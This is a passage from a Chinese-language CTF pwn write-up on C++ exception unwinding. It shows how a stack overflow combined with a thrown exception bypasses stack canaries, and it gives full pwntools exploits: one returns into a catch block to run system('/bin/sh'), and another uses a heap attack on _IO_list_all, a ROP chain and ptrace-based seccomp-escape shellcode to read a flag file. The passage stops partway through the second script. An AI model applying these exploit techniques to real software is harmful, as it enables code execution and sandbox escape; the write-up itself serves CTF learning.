class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">_Unwind_RaiseException,//用于栈展开，throw抛出异常被调用<br>_Unwind_Resume,<br>_Unwind_DeleteException,<br>_Unwind_GetGR,<br>_Unwind_SetGR,<br>_Unwind_GetIP,<br>_Unwind_SetIP,<br>_Unwind_GetRegionStart,<br>_Unwind_GetLanguageSpecificData,<br>_Unwind_ForcedUnwind<br></code></pre></td></tr></table></figure><p>_Unwind_RaiseException都会调用personality_routine（__gxx_personality_v0） ，两个合并完成的工作：</p><ul><li>_Unwind_RaiseException：会在内部把当前函数栈调用重建，然后传给personality_routine</li><li>personality_routine：1、检查是否有catch；2、清理调用的栈上局部变量</li></ul><p>当我们在程序里执行了抛出异常后，编译器为我们做了如下的事情：</p><ol><li>调用 __cxa_allocate_exception 函数，分配一个异常对象。</li><li>调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</li><li>__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</li><li>_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</li><li>该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</li><li>_Unwind_RaiseException() 将控制权转到相应的catch代码。</li><li>unwind 完成，用户代码继续执行。</li></ol><h3 id="分析catch捕获后的一个执行代码"><a href="#分析catch捕获后的一个执行代码" class="headerlink" title="分析catch捕获后的一个执行代码"></a>分析catch捕获后的一个执行代码</h3><p>首先了解一下<strong>DWARF</strong></p><blockquote><p>这是以一种统一的风格来适应多种语言符号化的源码级调试需求的调试信息格式</p></blockquote><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">readelf -wf <span class="hljs-keyword">throw</span>&gt;<span class="hljs-keyword">throw</span>.txt<br></code></pre></td></tr></table></figure><p>DW_CFA_def_cfa_expression很长</p><p>DW_CFA_def_cfa_expression就是DWARF调试信息格式中的一部分，特别是描述栈帧的恢复和计算方式。它包含了几个操作，表示了一种用于调试的栈帧指针（CFA，Canonical Frame Address）定义，使用的是一组DWARF操作码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DW_CFA_def_cfa_expression</span>：表示定义CFA的表达式。这是一个用于描述当前栈帧的指令，它提供了CFA的计算方式。<br><span class="hljs-attribute">DW_OP_breg7</span> (rsp)：这个操作表示使用寄存器<span class="hljs-number">7</span>（通常表示rsp寄存器，即栈指针）。这个操作返回rsp寄存器的当前值。<br><span class="hljs-attribute">DW_OP_breg16</span> (rip)：这个操作表示使用寄存器<span class="hljs-number">16</span>（通常表示rip寄存器，即指令指针）。它返回rip寄存器的当前值。<br><span class="hljs-attribute">DW_OP_lit15</span>：表示将字面量值<span class="hljs-number">15</span>加载到栈顶。字面量值通常是一些常量。<br><span class="hljs-attribute">DW_OP_and</span>：表示从栈中弹出两个值并进行按位与操作。这个操作会将结果压入栈顶。<br><span class="hljs-attribute">DW_OP_lit11</span>：将字面量值<span class="hljs-number">11</span>加载到栈顶。<br><span class="hljs-attribute">DW_OP_ge</span>：表示从栈中弹出两个值并进行大于等于比较。如果栈顶元素大于或等于次顶元素，则将结果（真或假）压入栈顶。<br><span class="hljs-attribute">DW_OP_lit3</span>：将字面量值<span class="hljs-number">3</span>加载到栈顶。<br><span class="hljs-attribute">DW_OP_shl</span>：表示从栈中弹出两个值，并将顶部的值左移指定数量。这里是将前一个值左移<span class="hljs-number">3</span>位。<br><span class="hljs-attribute">DW_OP_plus</span>：表示从栈中弹出两个值并相加。结果再压入栈顶。<br></code></pre></td></tr></table></figure><h2 id="C-异常处理攻击手法"><a href="#C-异常处理攻击手法" class="headerlink" title="C++异常处理攻击手法"></a>C++异常处理攻击手法</h2><h3 id="异常流程"><a href="#异常流程" class="headerlink" title="异常流程"></a>异常流程</h3><p>C++一个标准的抛出异常函数通过**_cxa_allocate<em>exception来完成初始化，然后通过</em>**<code>__cxa_throw</code>来完成抛出</p><p>最关键的函数，<code>_Unwind_RaiseException</code>栈展开和catch捕获的一个实现</p><p>如果捕获到会直接返回到catch块中，捕获完毕交给_Unwind_Resume，否则弹到stderr然后abort</p><p>进入catch块中，通过_Unwind_Resume恢复程序的正常执行流程，在调用栈中转移控制权，确保程序能从异常发生的地方继续执行</p><p>执行完成，通过<code>__cxa_begin_catch</code> 初始化与捕获异常相关的上下文执行</p><p><code>__cxa_end_catch</code>用于处理异常捕获结束后的清理工作，执行完成直接交给原有程序继续执行，发现本来的stack_fail检查没有了</p><p>如果这个时候存在栈溢出，通过栈溢出+异常触发就能绕过canary的检查，并且程序正常执行</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如果通过溢出覆盖了rbp，也能正常执行吗，是可以进行的，栈展开的时候是通过在内部把当前函数栈调用重建，然后通过回抛方式一层一层往上捕获的过程，不以当前rbp做操作</p><p>通过<code>_Unwind_RaiseException</code>依然能够捕获到catch块，并且rbp被覆盖</p><p>再次通过<code>_Unwind_Resume</code>恢复后rbp变为覆盖的地址，并且程序正常执行</p><p>如果后面程序执行函数返回leave;ret;我们能直接完成栈迁移控制rip</p><h2 id="logger-1"><a href="#logger-1" class="headerlink" title="logger"></a>logger</h2><p>盖rbp的时候，返回地址<code>0x401a37</code>，是try块下面的一个地址</p><p>指向的这个地址又是一个jmp，jmp后面的可以不用管，注意这里IDA识别catch块</p><p>当触发异常的时候会通过<code>_Unwind_Resume</code>一层一层抛上去</p><p>当在<code>Warn</code>函数触发异常的时候,throw先去捕获<code>Warn</code>的catch</p><p>然后会调转指向<code>_Unwind_Resume</code>现在还是再Warn函数中，还没有抛到上一层，通过<code>_Unwind_Resume</code>回抛到上一级<code>main</code>函数</p><p><code>main</code>函数中的catch块，然后再次通过<code>_Unwind_Resume</code>去恢复到原来mian函数的执行上下文</p><p>当覆盖返回地址的时候,如果覆盖地址为其他的try捕获,按照的栈展开回抛机制，程序会被回抛到，try对应的catch块中</p><p>把返回地址改为<code>0x401BC2+1(执行特性，下一条执行地址不能当前地址一样)</code>(存在system对一个全局变量的执行,改全局变量开可以使用<code>Trace</code>函数中存在的循环溢出来进行修改为<code>/bin/sh</code>)</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io_ch=<span class="hljs-number">0</span><br>de_bug=<span class="hljs-number">0</span><br>url=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>port=<span class="hljs-number">9999</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br>io=remote(url,port)<br><span class="hljs-keyword">else</span>:<br>io=process(filename)<br><span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br>gdb.attach(io,<span class="hljs-string">&quot;b * 0x401BD9&quot;</span>)<br>elf=ELF(filename)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pwn_exp</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWN&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>sla(<span class="hljs-string">&quot;Your chocie:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>sa(<span class="hljs-string">&quot;here: &quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>sla(<span class="hljs-string">&quot;Do you need to check the records? &quot;</span>,<span class="hljs-string">&#x27;n&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Your chocie:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>sa(<span class="hljs-string">&quot;here: &quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>sla(<span class="hljs-string">&quot;Do you need to check the records? &quot;</span>,<span class="hljs-string">&#x27;n&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Your chocie:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x404550</span>)+p64(<span class="hljs-number">0x401BC2</span>+<span class="hljs-number">1</span>)<br>sa(<span class="hljs-string">&quot;Type your message here plz: &quot;</span>,p1)<br><br><br><span class="hljs-comment">#log</span><br>log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>Pwn_exp()<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="hard-sandbox"><a href="#hard-sandbox" class="headerlink" title="hard+sandbox"></a>hard+sandbox</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># &lt;=0xf</span><br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-comment">#0x500&lt;= &lt;= 0x900</span><br>    sla(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-number">5</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x528</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x518</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>    free(<span class="hljs-number">1</span>)<br>    show(<span class="hljs-number">1</span>)<br>    libc.address = u64_ex(io.recv(<span class="hljs-number">6</span>))-<span class="hljs-number">0x730bdf41ace0</span>+<span class="hljs-number">0x730bdf200000</span><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x538</span>)<br>    free(<span class="hljs-number">2</span>)<br>    show(<span class="hljs-number">2</span>)<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>    edit(<span class="hljs-number">1</span>,p1)<br>    show(<span class="hljs-number">1</span>)<br>    ru(p1)<br>    heap_base = u64_ex(io.recv(<span class="hljs-number">6</span>))-<span class="hljs-number">0x290</span><br>    io_list_all = libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    p2 = p64_ex(libc.address + <span class="hljs-number">2208016</span>)*<span class="hljs-number">2</span>+p64_ex(heap_base+<span class="hljs-number">0x290</span>)+p64_ex(io_list_all-<span class="hljs-number">0x20</span>)<br>    edit(<span class="hljs-number">1</span>,p2)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x538</span>)<br>    CG.set_find_area(find_in_elf=<span class="hljs-literal">False</span>,find_in_libc=<span class="hljs-literal">True</span>)<br><br>    target_heap = heap_base + <span class="hljs-number">0xcd0</span><br>    fake_io = IO_FILE_plus_struct()<br>    fake_io.flags=<span class="hljs-number">0</span><br>    fake_io.vtable=libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    fake_io._IO_write_base = <span class="hljs-number">0</span><br>    fake_io._IO_write_ptr = <span class="hljs-number">1</span><br>    fake_io._wide_data=target_heap+<span class="hljs-built_in">len</span>(fake_io)<br>    p = <span class="hljs-string">b&#x27;&#x27;</span><br>    p = p.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(<span class="hljs-number">0</span>)<br>    p = p.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(<span class="hljs-number">0</span>)<br>    p = p.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(libc.address + <span class="hljs-number">0x53A1D</span>)<br>    p = p.ljust(<span class="hljs-number">0x98</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(CG.ret())<br>    p = p.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(target_heap+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x100</span>)+p64_ex(CG.ret())<br>    p = p.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64_ex(target_heap+<span class="hljs-number">0xe0</span>)<br>    p = p.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    p += p64_ex(CG.ret())<br>    p += p64_ex(CG.pop_rdi_ret())+p64_ex(target_heap+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x250</span>)+p64_ex(CG.pop_rsi_ret())+p64_ex(<span class="hljs-number">0x1000</span>)+p64_ex(<span class="hljs-number">0x000000000011f2e7</span>+libc.address)+p64_ex(<span class="hljs-number">7</span>)*<span class="hljs-number">2</span>+p64_ex(libc.sym.mprotect)<br>    p += p64_ex(CG.pop_rbx_ret())+p64_ex(target_heap+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x150</span>)+p64_ex(<span class="hljs-number">0x000000000002ab0f</span>+libc.address)<br><br>    p = p.ljust(<span class="hljs-number">0x250</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    NR_fork=<span class="hljs-number">57</span><br>    NR_ptrace=<span class="hljs-number">101</span><br>    NR_wait=<span class="hljs-number">61</span><br>    PTRACE_ATTACH=<span class="hljs-number">16</span><br>    PTRACE_SETOPTIONS = <span class="hljs-number">0x4200</span><br>    PTRACE_O_TRACESECCOMP   = <span class="hljs-number">0x00000080</span><br>    PTRACE_CONT = <span class="hljs-number">7</span><br>    PTRACE_DETACH=<span class="hljs-number">17</span><br>    shell = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">main:</span><br><span class="hljs-string">/*fork()*/</span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_fork&#125;</span></span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    pop rbx</span><br><span class="hljs-string">    test rax,rax</span><br><span class="hljs-string">    jz child_code</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/</span><br><span class="hljs-string">    xor r10, r10 </span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov rsi,rbx</span><br><span class="hljs-string">    mov rdi,<span class="hljs-subst">&#123;PTRACE_ATTACH&#125;</span>       </span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_ptrace&#125;</span></span><br><span class="hljs-string">    pop rax         </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* wait child  */         </span><br><span class="hljs-string">    xor rdi, rdi         </span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_wait&#125;</span></span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */</span><br><span class="hljs-string">    mov r10,<span class="hljs-subst">&#123;PTRACE_O_TRACESECCOMP&#125;</span></span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rsi,rbx </span><br><span class="hljs-string">    mov rdi, 0x4200 </span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_ptrace&#125;</span></span><br><span class="hljs-string">    pop rax                   </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    js error</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* ptrace(PTRACE_CONT, pid, NULL, NULL) */</span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rsi,rbx</span><br><span class="hljs-string">    mov rdi, <span class="hljs-subst">&#123;PTRACE_CONT&#125;</span>  /* PTRACE_CONT */</span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_ptrace&#125;</span></span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    js error</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* Wait seccomp  */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_wait&#125;</span></span><br><span class="hljs-string">    pop rax            </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rsi,rbx</span><br><span class="hljs-string">    mov rdi,<span class="hljs-subst">&#123;PTRACE_DETACH&#125;</span></span><br><span class="hljs-string">    push <span class="hljs-subst">&#123;NR_ptrace&#125;</span></span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    jmp end</span><br><span class="hljs-string"></span><br><span class="hljs-string">child_code:</span><br><span class="hljs-string">    <span class="hljs-subst">&#123;shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)&#125;</span></span><br><span class="hljs-string">    <span class="hljs-subst">&#123;shellcraft.sendfile(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)&#125;</span></span><br><span class="hljs-string">error:</span><br><span class="hljs-string">/* exit */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60           </span><br><span class="hljs-string">    syscall </span><br><span class="hljs-string">end:</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>    p+= asm(shell)<br><br>    pp = <span class="hljs-built_in">bytes</span>(fake_io)[<span class="hljs-number">0x10</span>:]+p<br>    edit(<span class="hljs-number">2</span>,pp)<br><br>    log.success(<span class="hljs-string">&#x27;_IO_wfile_jumps:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]))<br>    log.success(<span class="hljs-string">&quot;_IO_wfile_overflow:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;_IO_wfile_overflow&#x27;</span>]))<br>    log.success(<span class="hljs-string">&quot;setcontext:&quot;</span>+<span 